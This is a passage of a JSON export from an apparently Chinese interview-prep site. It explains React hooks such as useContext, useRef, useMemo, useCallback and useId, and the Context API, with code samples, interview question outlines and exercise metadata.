之状态获取与传递\n\n### 4.1 useContext\n\n**useContext 基础介绍**\n\n可以使用 useContext ，来获取父级组件传递过来的 context 值，这个当前值就是最近的父级组件 Provider 设置的 value 值，useContext 参数一般是由 createContext 方式创建的 ,也可以父级上下文 context 传递的 ( 参数为 context )。useContext 可以代替 context.Consumer 来获取 Provider 中保存的 value 值。\n\n```js\nconst contextValue = useContext(context)\n```\n\nuseContext 接受一个参数，一般都是 context 对象，返回值为 context 对象内部保存的 value 值。\n\n**useContext 基础用法：**\n\n```js\n/* 用useContext方式 */\nconst DemoContext = ()=> {\n    const value:any = useContext(Context)\n    /* my name is alien */\nreturn <div> my name is { value.name }</div>\n}\n\n/* 用Context.Consumer 方式 */\nconst DemoContext1 = ()=>{\n    return <Context.Consumer>\n         {/*  my name is alien  */}\n        { (value)=> <div> my name is { value.name }</div> }\n    </Context.Consumer>\n}\n\nexport default ()=>{\n    return <div>\n        <Context.Provider value={{ name:'alien' , age:18 }} >\n            <DemoContext />\n            <DemoContext1 />\n        </Context.Provider>\n    </div>\n}\n```\n\n### 4.2 useRef\n\n**useRef 基础介绍：**\n\nuseRef 可以用来获取元素，缓存状态，接受一个状态 initState 作为初始值，返回一个 ref 对象 cur, cur 上有一个 current 属性就是 ref 对象需要获取的内容。\n\n```js\nconst cur = React.useRef(initState)\nconsole.log(cur.current)\n```\n\n**useRef 基础用法：**\n\n**useRef 获取 DOM 元**素，在 React Native 中虽然没有 DOM 元素，但是也能够获取组件的节点信息（ fiber 信息 ）。\n\n```js\nconst DemoUseRef = ()=>{\n    const dom= useRef(null)\n    const handerSubmit = ()=>{\n        /*  <div >表单组件</div>  dom 节点 */\n        console.log(dom.current)\n    }\n    return <div>\n        {/* ref 标记当前dom节点 */}\n        <div ref={dom} >表单组件</div>\n        <button onClick={()=>handerSubmit()} >提交</button> \n    </div>\n}\n```\n\n如上通过 useRef 来获取 DOM 节点。\n\n**useRef 保存状态，** 可以利用 useRef 返回的 ref 对象来保存状态，只要当前组件不被销毁，那么状态就会一直存在。\n\n```js\nconst status = useRef(false)\n/* 改变状态 */\nconst handleChangeStatus = () => {\n  status.current = true\n}\n```\n\n### 4.3 useImperativeHandle\n\n**useImperativeHandle 基础介绍：**\n\nuseImperativeHandle 可以配合 forwardRef 自定义暴露给父组件的实例值。这个很有用，我们知道，对于子组件，如果是 class 类组件，我们可以通过 ref 获取类组件的实例，但是在子组件是函数组件的情况，如果我们不能直接通过 ref 的，那么此时 useImperativeHandle 和 forwardRef 配合就能达到效果。\n\nuseImperativeHandle 接受三个参数：\n\n-   ① 第一个参数ref: 接受 forWardRef 传递过来的 ref。\n-   ② 第二个参数 createHandle ：处理函数，返回值作为暴露给父组件的 ref 对象。\n-   ③ 第三个参数 deps : 依赖项 deps ，依赖项更改形成新的 ref 对象。\n\n**useImperativeHandle 基础用法：**\n\n我们来模拟给场景，用useImperativeHandle，使得父组件能让子组件中的input自动赋值并聚焦。\n\n```js\nfunction Son (props,ref) {\n    console.log(props)\n    const inputRef = useRef(null)\n    const [ inputValue , setInputValue ] = useState('')\n    useImperativeHandle(ref,()=>{\n       const handleRefs = {\n           /* 声明方法用于聚焦input框 */\n           onFocus(){\n              inputRef.current.focus()\n           },\n           /* 声明方法用于改变input的值 */\n           onChangeValue(value){\n               setInputValue(value)\n           }\n       }\n       return handleRefs\n    },[])\n    return <div>\n        <input\n            placeholder=\"请输入内容\"\n            ref={inputRef}\n            value={inputValue}\n        />\n    </div>\n}\n\nconst ForwarSon = forwardRef(Son)\n\nclass Index extends React.Component{\n    inputRef = null\n    handerClick(){\n       const { onFocus , onChangeValue } =this.cur\n       onFocus()\n       onChangeValue('let us learn React!')\n    }\n    render(){\n        return <div style={{ marginTop:'50px' }} >\n            <ForwarSon ref={node => (this.inputRef = node)} />\n            <button onClick={this.handerClick.bind(this)} >操控子组件</button>\n        </div>\n    }\n}\n```\n\n效果：\n\n![8e8c05f0c82c43719079d4db9536abc0_tplv-k3u1fbpfcp-watermark.gif](https://static.ecool.fun//article/24082f89-9189-4537-b827-ac5dcc542c08.awebp)\n\n## 五 hooks 之状态派生与保存\n\n### 5.1 useMemo\n\nuseMemo 可以在函数组件 render 上下文中同步执行一个函数逻辑，这个函数的返回值可以作为一个新的状态缓存起来。那么这个 hooks 的作用就显而易见了：\n\n场景一：在一些场景下，需要在函数组件中进行大量的逻辑计算，那么我们不期望每一次函数组件渲染都执行这些复杂的计算逻辑，所以就需要在 useMemo 的回调函数中执行这些逻辑，然后把得到的产物（计算结果）缓存起来就可以了。\n\n场景二：React 在整个更新流程中，diff 起到了决定性的作用，比如 Context 中的 provider 通过 diff value 来判断是否更新\n\n**useMemo 基础介绍：**\n\n```js\nconst cacheSomething = useMemo(create,deps)\n```\n\n-   ① create：第一个参数为一个函数，函数的返回值作为缓存值，如上 demo 中把 Children 对应的 element 对象，缓存起来。\n-   ② deps： 第二个参数为一个数组，存放当前 useMemo 的依赖项，在函数组件下一次执行的时候，会对比 deps 依赖项里面的状态，是否有改变，如果有改变重新执行 create ，得到新的缓存值。\n-   ③ cacheSomething：返回值，执行 create 的返回值。如果 deps 中有依赖项改变，返回的重新执行 create 产生的值，否则取上一次缓存值。\n\n**useMemo 基础用法：**\n\n派生新状态：\n\n```js\nfunction Scope() {\n    const keeper = useKeep()\n    const { cacheDispatch, cacheList, hasAliveStatus } = keeper\n   \n    /* 通过 useMemo 得到派生出来的新状态 contextValue  */\n    const contextValue = useMemo(() => {\n        return {\n            cacheDispatch: cacheDispatch.bind(keeper),\n            hasAliveStatus: hasAliveStatus.bind(keeper),\n            cacheDestory: (payload) => cacheDispatch.call(keeper, { type: ACTION_DESTORY, payload })\n        }\n      \n    }, [keeper])\n    return <KeepaliveContext.Provider value={contextValue}>\n    </KeepaliveContext.Provider>\n}\n```\n\n如上通过 useMemo 得到派生出来的新状态 contextValue ，只有 keeper 变化的时候，才改变 Provider 的 value 。\n\n缓存计算结果：\n\n```js\nfunction Scope(){\n    const style = useMemo(()=>{\n      let computedStyle = {}\n      // 经过大量的计算\n      return computedStyle\n    },[])\n    return <div style={style} ></div>\n}\n```\n\n缓存组件,减少子组件 rerender 次数：\n\n```js\nfunction Scope ({ children }){\n   const renderChild = useMemo(()=>{ children()  },[ children ])\n   return <div>{ renderChild } </div>\n}\n```\n\n### 5.2 useCallback\n\n**useCallback 基础介绍：**\n\nuseMemo 和 useCallback 接收的参数都是一样，都是在其依赖项发生变化后才执行，都是返回缓存的值，区别在于 useMemo 返回的是函数运行的结果，useCallback 返回的是函数，这个回调函数是经过处理后的也就是说父组件传递一个函数给子组件的时候，由于是无状态组件每一次都会重新生成新的 props 函数，这样就使得每一次传递给子组件的函数都发生了变化，这时候就会触发子组件的更新，这些更新是没有必要的，此时我们就可以通过 usecallback 来处理此函数，然后作为 props 传递给子组件。\n\n**useCallback 基础用法：**\n\n```js\n/* 用react.memo */\nconst DemoChildren = React.memo((props)=>{\n   /* 只有初始化的时候打印了 子组件更新 */\n    console.log('子组件更新')\n   useEffect(()=>{\n       props.getInfo('子组件')\n   },[])\n   return <div>子组件</div>\n})\n\nconst DemoUseCallback=({ id })=>{\n    const [number, setNumber] = useState(1)\n    /* 此时usecallback的第一参数 (sonName)=>{ console.log(sonName) }\n     经过处理赋值给 getInfo */\n    const getInfo  = useCallback((sonName)=>{\n          console.log(sonName)\n    },[id])\n    return <div>\n        {/* 点击按钮触发父组件更新 ，但是子组件没有更新 */}\n        <button onClick={ ()=>setNumber(number+1) } >增加</button>\n        <DemoChildren getInfo={getInfo} />\n    </div>\n}\n```\n\n## 六 hooks 之工具 hooks\n\n### 6.1 useDebugValue\n\n> 我们不推荐你向每个自定义 Hook 添加 debug 值。当它作为共享库的一部分时才最有价值。在某些情况下，格式化值的显示可能是一项开销很大的操作。除非需要检查 Hook，否则没有必要这么做。因此，useDebugValue 接受一个格式化函数作为可选的第二个参数。该函数只有在 Hook 被检查时才会被调用。它接受 debug 值作为参数，并且会返回一个格式化的显示值。\n\n**useDebugValue 基础介绍：**\n\nuseDebugValue 可用于在 React 开发者工具中显示自定义 hook 的标签。这个hooks目的就是检查自定义hooks。\n\n**useDebugValue 基本使用：**\n\n```js\nfunction useFriendStatus(friendID) {\n  const [isOnline, setIsOnline] = useState(null);\n  // ...\n  // 在开发者工具中的这个 Hook 旁边显示标签\n  // e.g. \"FriendStatus: Online\"\n  useDebugValue(isOnline ? 'Online' : 'Offline');\n\n  return isOnline;\n}\n```\n\n### 6.2 useId\n\n**useID 基础介绍:**\n\nuseId 也是 React v18 产生的新的 hooks , 它可以在 client 和 server 生成唯一的 id , 解决了在服务器渲染中，服务端和客户端产生 id 不一致的问题，更重要的是保障了 React v18 中 **streaming renderer （流式渲染）** 中 id 的稳定性。\n\n**低版本 React ssr 存在的问题：**\n\n比如在一些项目或者是开源库中用 Math.random() 作为 ID 的时候，可以会有一些随机生成 id 的场景：\n\n```js\nconst rid = Math.random() + '_id_'  /* 生成一个随机id  */\nfunction Demo (){\n   // 使用 rid \n   return <div id={rid} ></div>\n}\n```\n\n这在纯客户端渲染中没有问题，但是在服务端渲染的时候，传统模式下需要走如下流程：\n\n![e54da686-6d8e-4431-a378-c05ac49cb6fb.png](https://static.ecool.fun//article/35a51a65-64c2-4889-abbf-f92a961b88c8.awebp)\n\n在这个过程中，当服务端渲染到 html 和 hydrate 过程分别在服务端和客户端进行，但是会走两遍 id 的生成流程，这样就会造成 id不一致的情况发生。useId 的出现能有效的解决这个问题。\n\n**useId 基本用法:**\n\n```js\nfunction Demo (){\n   const rid = useId() // 生成稳定的 id \n   return <div id={rid} ></div>\n}\n```\n\n**v18 ssr**\n\n在 React v18 中 对 ssr 增加了流式渲染的特性 [New Suspense SSR Architecture in React 18](https://github.com/reactwg/react-18/discussions/37 \"https://github.com/reactwg/react-18/discussions/37\") ， 那么这个特性是什么呢？我们来看一下：\n\n在传统 React ssr 中，如果正常情况下， hydrate 过程如下所示：\n\n![WechatIMG6936.jpeg](https://static.ecool.fun//article/6559cf99-a614-4a80-b78f-c95e613c31bb.awebp)\n\n刚开始的时候，因为服务端渲染，只会渲染 html 结构，此时还没注入 js 逻辑，所以我们把它用灰色不能交互的模块表示。（如上灰色的模块不能做用户交互，比如点击事件之类的。）\n\nhydrate js 加载之后，此时的模块可以正常交互，所以用绿色的模块展示。\n\n但是如果其中一个模块，服务端请求数据，数据量比较大，耗费时间长，我们不期望在服务端完全形成 html 之后在渲染，那么 React 18 给了一个新的可能性。可以使用 包装页面的一部分，然后让这一部分的内容先挂起。\n\n接下来会通过 script 加载 js 的方式 流式注入 html 代码的片段，来补充整个页面。接下来的流程如下所示：\n\n![d94d8ddb-bdcd-4be8-a851-4927c7966b99.png](https://static.ecool.fun//article/0ce63084-7c34-42e5-b29d-eed751962da1.awebp)\n\n在这个原理基础之上， React 个特性叫 Selective Hydration，可以**根据用户交互改变 hydrate 的顺序**。\n\n比如有两个模块都是通过 Suspense 挂起的，当两个模块发生交互逻辑时，会根据交互来选择性地改变 hydrate 的顺序。\n\n![ede45613-9994-4e77-9f50-5b7c1faf1160.png](https://static.ecool.fun//article/6e91e2ca-4b55-4c6a-8858-f93429f4c1ee.awebp)\n\n如上 C D 选择性的 hydrate 就是 Selective Hydration 的结果。那么回到主角 useId 上，如果在 hydrate 过程中，C D 模块 id 是动态生成的，比如如下：\n\n```js\nlet id = 0\nfunction makeId(){\n  return id++\n}\nfunction Demo(){\n  const id = useRef( makeId() )\n  return <div id={id}  >...</div>\n}\n```\n\n那么如果组件是 Selective Hydration , 那么注册组件的顺序服务端和客户端有可能不统一，这样表现就会不一致了。那么用 useId 动态生成 id 就不会有这个问题产生了，所以说 useId 保障了 React v18 中 **streaming renderer （流式渲染）** 中 id 的稳定性。\n",
    "testPoint": "## **1. Hooks 的基本概念**\n### **考察点：**\n- 什么是 Hooks？为什么 React 引入 Hooks？\n- Hooks 的使用规则（只能在顶层调用、只能在函数组件中使用）\n- Hooks 和类组件的生命周期对比\n\n### **示例问题：**\n- 为什么 React 引入 Hooks？它解决了什么问题？\n- React Hooks 有哪些使用限制？\n\n**示例代码：**\n```jsx\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  return <button onClick={() => setCount(count + 1)}>Click: {count}</button>;\n}\n```\n\n---\n\n## **2. 常见的核心 Hooks**\nReact 提供了多个内置 Hooks，面试中最常考的包括：\n\n### **(1) `useState`**\n### **考察点：**\n- `useState` 的基本用法\n- 什么时候使用函数式更新？\n- `useState` 里的值为什么不能直接修改？\n\n### **示例问题：**\n- `useState` 更新状态是同步还是异步的？\n- 下面代码有什么问题？\n```jsx\nconst [count, setCount] = useState(0);\nsetCount(count + 1);\nsetCount(count + 1);\nconsole.log(count);\n```\n- 如何正确更新 `count` ？\n\n**正确示例（使用函数式更新）：**\n```jsx\nsetCount(prevCount => prevCount + 1);\nsetCount(prevCount => prevCount + 1);\n```\n\n---\n\n### **(2) `useEffect`**\n### **考察点：**\n- `useEffect` 依赖数组 `[ ]`、`[deps]` 和无依赖时的区别\n- 如何模拟 `componentDidMount`、`componentDidUpdate` 和 `componentWillUnmount`\n- `useEffect` 中 `return` 函数的作用（清理副作用）\n- `useLayoutEffect` 和 `useEffect` 的区别\n\n### **示例问题：**\n- `useEffect(() => {}, [])` 和 `useEffect(() => {}, [deps])` 的区别？\n- 下面代码会触发无限循环吗？\n```jsx\nuseEffect(() => {\n  setCount(count + 1);\n}, [count]);\n```\n\n**正确写法（避免无限循环）：**\n```jsx\nuseEffect(() => {\n  setCount(prevCount => prevCount + 1);\n}, []);\n```\n\n---\n\n### **(3) `useRef`**\n### **考察点：**\n- `useRef` 如何获取 DOM 元素？\n- `useRef` 和 `useState` 的区别？\n- `useRef` 什么时候会引发重新渲染？\n\n### **示例问题：**\n- `useRef` 的值变了会触发组件重新渲染吗？\n- `useRef` 在哪些场景下使用？\n\n**示例代码（获取 DOM 元素）：**\n```jsx\nconst inputRef = useRef(null);\nuseEffect(() => {\n  inputRef.current.focus();\n}, []);\nreturn <input ref={inputRef} />;\n```\n\n---\n\n### **(4) `useMemo` & `useCallback`**\n### **考察点：**\n- `useMemo` 和 `useCallback` 的区别？\n- 如何避免不必要的组件重新渲染？\n- `useMemo` 的返回值会缓存多久？\n\n### **示例问题：**\n- `useMemo` 什么时候使用？能优化什么问题？\n- `useMemo(() => computeExpensiveValue(), [deps])` 和 `computeExpensiveValue()` 有什么区别？\n\n**示例代码（缓存计算结果）：**\n```jsx\nconst memoizedValue = useMemo(() => expensiveFunction(a, b), [a, b]);\n```\n\n**示例代码（缓存函数）：**\n```jsx\nconst memoizedCallback = useCallback(() => handleClick(id), [id]);\n```\n\n---\n\n### **(5) `useContext`**\n### **考察点：**\n- `useContext` 如何替代 `props` 传递？\n- `useContext` 什么时候会重新渲染？\n\n### **示例问题：**\n- `useContext` 什么时候会导致组件重新渲染？\n- `useContext` 和 `Redux` 该如何选择？\n\n**示例代码（使用 `useContext` 共享数据）：**\n```jsx\nconst ThemeContext = React.createContext('light');\nconst theme = useContext(ThemeContext);\n```\n\n---\n\n### **(6) `useReducer`**\n### **考察点：**\n- `useReducer` 和 `useState` 的区别？\n- 适合用 `useReducer` 的场景？\n- `useReducer` 如何搭配 `useContext` 使用？\n\n### **示例问题：**\n- `useReducer` 和 `Redux` 的区别是什么？\n- 如何使用 `useReducer` 管理复杂的状态？\n\n**示例代码（用 `useReducer` 代替 `useState`）：**\n```jsx\nconst reducer = (state, action) => {\n  switch (action.type) {\n    case 'increment': return { count: state.count + 1 };\n    default: return state;\n  }\n};\n\nconst [state, dispatch] = useReducer(reducer, { count: 0 });\n```\n\n---\n\n## **3. 自定义 Hooks**\n### **考察点：**\n- 如何封装一个 `useFetch` 自定义 Hook？\n- 如何避免自定义 Hook 里的闭包陷阱？\n- 如何在自定义 Hook 里使用 `useRef` 和 `useMemo`？\n\n### **示例问题：**\n- 什么情况下你会封装一个自定义 Hook？\n- 如何在自定义 Hook 里处理副作用？\n\n**示例代码（封装 `useFetch`）：**\n```jsx\nfunction useFetch(url) {\n  const [data, setData] = useState(null);\n  useEffect(() => {\n    fetch(url).then(res => res.json()).then(setData);\n  }, [url]);\n  return data;\n}\n```\n\n---\n\n## **4. Hooks 相关的常见问题**\n### **(1) Hooks 规则**\n- 只能在函数组件或自定义 Hook 顶层调用\n- 不能在 `if` 语句、循环里调用\n\n### **(2) `useState` 和 `useRef` 的区别**\n| `useState` | `useRef` |\n|------------|----------|\n| 触发重新渲染 | 不会触发重新渲染 |\n| 值存在组件的 `state` 里 | 值存在 `ref` 对象的 `current` 里 |\n\n### **(3) `useEffect` 的依赖**\n```jsx\nuseEffect(() => {\n  console.log(count);\n}, [count]); // 依赖 count，每次 count 变化时执行\n```\n- 依赖数组为空 `[]` -> 只在组件挂载时执行\n- 没有依赖数组 -> 每次渲染都会执行\n- 依赖 `[count]` -> `count` 变化时执行\n\n---\n\n## **5. Hooks 的性能优化**\n### **考察点：**\n- 避免不必要的 `useEffect`\n- 使用 `useMemo` 缓存计算\n- 使用 `useCallback` 避免函数重复创建\n- 使用 `React.memo` 避免子组件重复渲染\n\n### **示例问题：**\n- `useEffect` 里如何避免不必要的 API 请求？\n- `useMemo` 为什么能提高性能？",
    "exerciseKeyList": "[\"467f7aeb-e452-421e-9404-da26f158adee\",\"460a9714-1001-4beb-b12a-be8fec732879\",\"2ed6f1f7-b974-475a-b314-f1962c744faf\",\"672716f5-203b-4928-afdc-44d6e8793663\",\"559aab33-1ef2-4fb1-bdba-2233423fb845\",\"35528a50-c820-4037-beec-ec309c4f2a46\",\"37ab3a5b-b59d-433c-8db9-b6a7444337c3\",\"4caa6281-4592-4f6b-ac70-73effa2bcf0d\",\"8d97f05b-37a5-4a58-8dff-0574918ccd67\",\"d7dc9c83-0fa2-4510-b098-e92de7637209\",\"32a7006f-143a-4490-baf1-c903f98d826b\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:22:13.000Z",
    "updateAt": "2025-02-08T01:19:22.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "2ed6f1f7-b974-475a-b314-f1962c744faf",
        "title": "你常用的 React Hooks 有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-03T05:19:54.000Z",
        "updateAt": "2024-07-23T10:16:23.000Z"
      },
      {
        "exerciseKey": "32a7006f-143a-4490-baf1-c903f98d826b",
        "title": "使用 useState （const [test, setTest] = useState([])）时，为什么连续调用 setTest({...test, newValue}) 会出现值的丢失？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T08:18:17.000Z",
        "updateAt": "2023-03-26T08:34:59.000Z"
      },
      {
        "exerciseKey": "35528a50-c820-4037-beec-ec309c4f2a46",
        "title": "React Hooks当中的useEffect是如何区分生命周期钩子的\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:29:15.000Z",
        "updateAt": "2024-08-10T17:05:10.000Z"
      },
      {
        "exerciseKey": "37ab3a5b-b59d-433c-8db9-b6a7444337c3",
        "title": "React Hooks带来了什么便利？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T12:26:12.000Z",
        "updateAt": "2024-08-10T17:05:05.000Z"
      },
      {
        "exerciseKey": "460a9714-1001-4beb-b12a-be8fec732879",
        "title": "使用 React hooks 怎么实现类里面的所有生命周期？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-01-09T12:00:38.000Z",
        "updateAt": "2024-08-10T21:50:10.000Z"
      },
      {
        "exerciseKey": "467f7aeb-e452-421e-9404-da26f158adee",
        "title": "React 中的 hooks 和 memorizedState 是什么关系?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:22.000Z",
        "updateAt": "2024-09-04T01:19:05.000Z"
      },
      {
        "exerciseKey": "4caa6281-4592-4f6b-ac70-73effa2bcf0d",
        "title": "使用React Hooks有什么优势？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:56:35.000Z",
        "updateAt": "2021-07-04T21:30:30.000Z"
      },
      {
        "exerciseKey": "559aab33-1ef2-4fb1-bdba-2233423fb845",
        "title": "React Hooks 在使用上有哪些限制？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-16T14:57:34.000Z",
        "updateAt": "2024-09-03T13:10:34.000Z"
      },
      {
        "exerciseKey": "672716f5-203b-4928-afdc-44d6e8793663",
        "title": "为什么不能在循环、条件或嵌套函数中调用 Hooks？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-05-29T12:58:22.000Z",
        "updateAt": "2024-08-10T17:06:41.000Z"
      },
      {
        "exerciseKey": "8d97f05b-37a5-4a58-8dff-0574918ccd67",
        "title": "useEffect 与 useLayoutEffect 有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-16T14:58:54.000Z",
        "updateAt": "2024-07-23T10:23:05.000Z"
      },
      {
        "exerciseKey": "d7dc9c83-0fa2-4510-b098-e92de7637209",
        "title": "为什么 useState 返回的是数组而不是对象？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2022-01-16T14:55:35.000Z",
        "updateAt": "2024-08-10T19:51:02.000Z"
      }
    ]
  },
  "198": {
    "id": 198,
    "tagId": 13,
    "title": "Context API",
    "explanation": "## 先看看React官网对于Context的介绍\n\n> Context 提供了一个无需为每层组件手动添加 props，就能在组件树间进行数据传递的方法。在一个典型的 React 应用中，数据是通过 props 属性自上而下（由父及子）进行传递的，但这种做法对于某些类型的属性而言是极其繁琐的（例如：地区偏好，UI 主题），这些属性是应用程序中许多组件都需要的。Context 提供了一种在组件之间共享此类值的方式，而不必显式地通过组件树的逐层传递 props。\n\n个人理解转成大白话：`Context`提供了一个**局部的全局作用域**，使用Context则无需再手动的逐层传递`props`。\n\n本文主要介绍3种`Context`的使用方式：\n\n1.  `React.createContext`提供的`Provider`和`Consumer`\n2.  函数组件：`React.createContext`提供的`Provider`和`useContext`钩子\n3.  Class组件：`React.createContext`提供的`Provider`和`class`的`contextType`属性\n\n### 第一种：React.createContext提供的Provider和Consumer\n\n先写好使用`Context`的基础环境条件，后续的代码都是基于此环境\n\n```javascript\n//创建一个文件，暂且命名为context.js，导出createContext()的返回值\nimport { createContext } from \"react\";\n\nexport default createContext();\n```\n\n在根组件`App.jsx`中，导入上面写的`context`，并使用`context`提供的`Provider`组件进行包裹，圈定**局部的全局作用域**，传值后可以提供给子组件进行消费\n\n> 当 Provider 的 value 值发生变化时，它内部的所有消费组件都会重新渲染。Provider 及其内部 consumer 组件都不受制于 shouldComponentUpdate 函数，因此当 consumer 组件在其祖先组件退出更新的情况下也能更新。\n\n```javascript\nimport React, { createContext } from \"react\";\nimport MyContext from \"./context\";\n\nimport GeneralC from \"./GeneralC\";\nimport FnC from \"./FnC\";\nimport ClassC from \"./ClassC\";\n\nexport default function App() {\n  return (\n    //Provider组件接收一个value属性，此处传入一个带有name属性的对象\n    <MyContext.Provider value={{ name: `context's value is string!` }}>\n      {/*这里写后面要进行包裹的子组件,此处先行导入后续需要消费context的3个组件*/}\n      <GeneralC/>\n      <hr/>\n      <FnC/>\n      <hr/>\n      <ClassC/>\n    </MyContext.Provider>\n  );\n}\n```\n\n在`GeneralC`组件中,导入`context`,使用其提供的`Consumer`组件来订阅`Context`的变更,需要一个函数作为子元素,函数的第一个形参便是`Provider`组件提供的`value`值\n\n```javascript\nimport React, { useReducer } from \"react\";\nimport MyContext from \"./context\";\n\nconst GeneralC = () => {\n  return (\n    //\n    <MyContext.Consumer>\n      {(value) => {\n        return (\n          <div>\n            第一种使用Context方式获取的值：{JSON.stringify(value)}\n          </div>\n        );\n      }}\n    </MyContext.Consumer>\n  );\n};\n\nexport default GeneralC;\n```\n\n此时页面中应该出现json格式的value值\n\n![](https://static.ecool.fun//article/77e9c411-4a0a-415e-aef5-d173bbd47db9.awebp)\n\n### 第二种：函数组件：React.createContext提供的Provider和useContext钩子\n\n导入`useContext`钩子函数,该函数接收`createContext()`的返回值,返回的结果为该`context`的当前值,当前的 `context` 值由上层组件中距离当前组件最近的 `<MyContext.Provider>` 的 `value prop` 决定。\n\n```javascript\nimport React, { useContext } from \"react\";\nimport MyContext from \"./context\";\n\nconst FnC = () => {\n  const context = useContext(MyContext);\n  return <div>第二种使用Context方式获取的值：{JSON.stringify(context)}</div>;\n};\n\nexport default FnC;\n```\n\n此时页面中应该出现两条json格式的value值\n\n![](https://static.ecool.fun//article/fd1f15aa-473c-42c5-8827-ad9ffb32980a.awebp)\n\n### 第三种：Class组件：React.createContext提供的Provider和class的contextType属性\n\n> 挂载在 class 上的 contextType 属性会被重赋值为一个由 React.createContext() 创建的 Context 对象。这能让你使用 this.context 来消费最近 Context 上的那个值。你可以在任何生命周期中访问到它，包括 render 函数中。 使用`static`关键字添加静态属性，和直接在`class`添加属性效果一致,最终都会添加到类上，而不是类的实例上\n\n```javascript\nimport React, { Component } from \"react\";\nimport context from \"./context\";\n\nclass ClassC extends Component {\n  static contextType = context;\n  render() {\n    const value = this.context;\n    return <div>第三种使用Context方式获取的值：{JSON.stringify(value)}</div>;\n  }\n}\n\n// ClassC.contextType = context; //此处与写static关键字作用一致\nexport default ClassC;\n```\n\n此时页面中应该出现三条json格式的value值 ![](https://static.ecool.fun//article/3af1130d-bc73-4088-8d07-2f02bb1ee2ca.awebp)\n\n### 既然能读Context，也自然能写Context，改写下代码(部分代码省略)\n\n在`App.js`组件中更改`context`，只是调用组件自身的`setStore`函数\n\n```javascript\nimport React, { useState } from \"react\";\n//导入useState钩子\n...\n\nconst value = {\n  name: `context's value is string!`\n};\n\nexport default function App() {\n  const [store, setStore] = useState(value);\n  //Provider的value不再传入一个简单结构的对象，而是将useState的返回值作为新对象的key/value,子组件便能调用App的setStore函数进行更新\n  return (\n    <MyContext.Provider value={{ store, setStore }}>\n       {/* 在父组件更改Context */}\n      <button\n        onClick={() => {\n          setStore({\n            name: \"App change value!\"\n          });\n        }}\n      >\n        App的change context\n      </button>\n       {/* 此处为组件引入,省略... */}\n    </MyContext.Provider>\n  );\n}\n```\n\n此时页面中应该出现一个按钮，点击`App的...`按钮时，`store`更新为`App change value!`，订阅了`context`的子组件都能更新到最新的值 ![](https://static.ecool.fun//article/d41e4400-130e-4b8a-8d69-2328afe6ef39.awebp)\n\n再来改写子组件，在子组件中更新`context`，这里选择`FnC`组件来更新，原代码不需要更改，新增一个按钮，用来调用`context`传入的`setStore`函数\n\n```javascript\nimport React, { useContext } from \"react\";\nimport MyContext from \"./context\";\n\nconst Component = () => {\n  const context = useContext(MyContext);\n  return (\n    <div>\n      第二种使用Context方式获取的值：{JSON.stringify(context)}\n      <button\n        onClick={() => {\n          context.setStore({\n            name: \"FnC change value!\"\n          });\n        }}\n      >\n        FnC子组件的change context\n      </button>\n    </div>\n  );\n};\n\nexport default Component;\n```\n\n此时页面中应该再出现一个按钮，点击`FnC的...`按钮时，`store`更新为`FnC change value!`，效果和在`App`组件中修改一致，这样子组件便也有了更新`context`的能力 ![](https://static.ecool.fun//article/00fbe4ce-3f10-401a-9761-9e1c6f3f117c.awebp)\n\n",
    "testPoint": "## **1. React Context 基础概念**\n### **考察点：**\n- 什么是 `Context`？它解决了什么问题？\n- 为什么 `Context` 可以避免 **prop drilling（属性层层传递）**？\n- `Context` 的基本 API：`createContext`、`Provider`、`Consumer`、`useContext`\n- `useContext` 和 `Consumer` 的区别？\n\n### **示例问题：**\n- 为什么 React 需要 `Context`？\n- `Context` 的数据如何在组件树中传播？\n- `Context` 提供的值如何更新？\n\n### **示例代码（创建 Theme Context 并使用 Provider）：**\n```jsx\nconst ThemeContext = React.createContext('light');\n\nfunction App() {\n  return (\n    <ThemeContext.Provider value=\"dark\">\n      <Child />\n    </ThemeContext.Provider>\n  );\n}\n\nfunction Child() {\n  const theme = useContext(ThemeContext);\n  return <div>当前主题：{theme}</div>;\n}\n```\n\n---\n\n## **2. Context API 及其使用**\n### **(1) `createContext`**\n- 用于创建一个 Context 实例，通常 `Provider` 和 `Consumer` 都基于这个实例。\n\n### **(2) `Provider`**\n- `Provider` 组件提供 `value`，整个子组件树都可以访问这个值。\n- 只要 `value` 发生变化，**所有使用该 Context 的组件都会重新渲染**。\n\n### **(3) `Consumer`**\n- `Consumer` 方式可以访问 Context 值，但相比 `useContext` 代码更冗长。\n- **推荐使用 `useContext`，避免嵌套 JSX**。\n\n```jsx\n<ThemeContext.Consumer>\n  {value => <div>当前主题：{value}</div>}\n</ThemeContext.Consumer>\n```\n\n### **(4) `useContext`**\n- `useContext` 允许函数组件直接访问 `Context` 值，而不需要 `Consumer` 组件。\n\n```jsx\nconst theme = useContext(ThemeContext);\n```\n\n---\n\n## **3. Context 相关的常见问题**\n### **(1) Context 何时会触发组件重新渲染？**\n- 任何 `Provider` 的 `value` 发生变化时，所有使用该 Context 的组件都会 **重新渲染**。\n- 需要注意 `value` 传递的是对象时，避免不必要的重新渲染。\n\n### **(2) `useContext` 为什么会导致性能问题？**\n- `useContext` 直接依赖 `Provider` 的 `value`，一旦 `value` 发生变化，所有 `useContext` 使用的组件都会 **重新渲染**。\n- **即使组件不使用 Context 里的数据，也会重新渲染**。\n\n**示例代码（错误示例）：**\n```jsx\nconst CountContext = React.createContext({ count: 0 });\n\nfunction App() {\n  const [count, setCount] = useState(0);\n\n  return (\n    <CountContext.Provider value={{ count }}>\n      <Child />\n      <button onClick={() => setCount(count + 1)}>+1</button>\n    </CountContext.Provider>\n  );\n}\n```\n⚠ **问题：**  \n即使 `Child` 组件不使用 `count`，它仍然会重新渲染。因为 `{ count }` 是一个新对象，每次 `setCount` 触发 `App` 重新渲染时，`value={{ count 